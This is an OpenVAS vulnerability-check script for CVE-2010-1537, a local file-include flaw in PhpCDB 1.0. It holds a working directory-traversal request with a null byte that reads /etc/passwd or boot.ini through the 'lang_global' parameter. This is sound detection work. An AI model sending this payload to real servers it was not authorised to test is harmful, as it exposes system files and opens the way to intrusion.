###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_PhpCDB_38507.nasl 14 2013-10-27 12:33:37Z jan $
#
# PhpCDB 'lang_global' Parameter Multiple Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "PhpCDB is prone to multiple local file-include vulnerabilities because
it fails to properly sanitize user-supplied input.

An attacker can exploit these vulnerabilities to obtain
potentially sensitive information and execute arbitrary local
scripts in the context of the webserver process. This may allow
the attacker to compromise the application and the computer; other
attacks are also possible.

PhpCDB 1.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100516);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-03-04 12:28:05 +0100 (Thu, 04 Mar 2010)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2010-1537");
 script_bugtraq_id(38507);
 script_tag(name:"risk_factor", value:"High");

 script_name("PhpCDB 'lang_global' Parameter Multiple Local File Include Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/38507");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/phpcdb/");

 script_description(desc);
 script_summary("Determine if PhpCDB is prone to local file-include vulnerabilities");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/phpcdb",cgi_dirs());

foreach dir (dirs) {
  foreach file (make_list("etc/passwd", "boot.ini")) {
   
    url = string(dir,"/firstvisit.php?lang_global=../../../../../../../../../",file,"%00"); 
    req = http_get(item:url, port:port);
    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
    if( buf == NULL )continue;

    if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string: buf)) {
     
      security_hole(port:port);
      exit(0);

    }
  }
}

exit(0);
